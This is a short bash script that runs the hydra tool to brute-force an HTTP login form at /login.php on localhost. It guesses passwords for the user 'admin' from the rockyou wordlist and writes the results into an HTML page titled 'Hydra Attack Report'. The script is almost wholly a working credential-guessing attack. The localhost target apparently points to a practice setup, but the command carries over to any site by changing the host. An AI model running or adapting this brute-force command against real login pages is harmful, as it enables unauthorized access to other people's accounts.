#!/bin/bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=login failed" -t 4 > output.txt

echo "<html><head><style>body{background:black;color:white;font-family:monospace;}</style></head><body><h1>Hydra Attack Report</h1><pre>$(cat output.txt)</pre></body></html>" > index.html
